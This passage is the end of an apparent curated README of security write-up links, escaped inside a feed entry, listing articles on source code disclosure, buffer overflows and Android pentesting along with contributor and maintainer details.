href=&#34;https://www.amolbaikar.com/facebook-source-code-disclosure-in-ads-api/&#34;&gt;Facebook source code disclosure in ads API&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@luanherrera/xs-searching-googles-bug-tracker-to-find-out-vulnerable-source-code-50d8135b7549&#34;&gt;XS-Searching Google’s bug tracker to find out vulnerable source code&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Buffer Overflow Writeups&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://www.cis.syr.edu/~wedu/seed/Book/book_sample_buffer.pdf&#34;&gt;Buffer Overflow Attack Book pdf&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/npapernot/buffer-overflow-attack&#34;&gt;Github Repository on Buffer Overflow Attack&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.rapid7.com/2019/02/19/stack-based-buffer-overflow-attacks-what-you-need-to-know/&#34;&gt;Stack-Based Buffer Overflow Attacks: Explained and Examples&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.netsparker.com/blog/web-security/buffer-overflow-attacks/&#34;&gt;How Buffer Overflow Attacks Work&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.usejournal.com/binary-exploitation-buffer-overflows-a9dc63e8b546&#34;&gt;Binary Exploitation: Buffer Overflows&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.veracode.com/security/buffer-overflow&#34;&gt;WHAT IS A BUFFER OVERFLOW? LEARN ABOUT BUFFER OVERRUN VULNERABILITIES, EXPLOITS &amp;amp; ATTACKS&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Android Pentesting&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/android-pentesting-lab-4a6fe1a1d2e0&#34;&gt;Android Pentesting Lab (Step by Step guide for beginners!)&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Open Pull Requests&lt;/li&gt; &#xA; &lt;li&gt;Send me links of writeups to My Twitter : &lt;a href=&#34;https://twitter.com/0xAsm0d3us&#34;&gt;0xAsm0d3us&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Maintainers&lt;/h2&gt; &#xA;&lt;p&gt;&lt;code&gt;This Repo is maintained by : &lt;/code&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/devanshbatham&#34;&gt;devanshbatham&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/e13v3n-0xb&#34;&gt;e13v3n-0xb&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
</feed>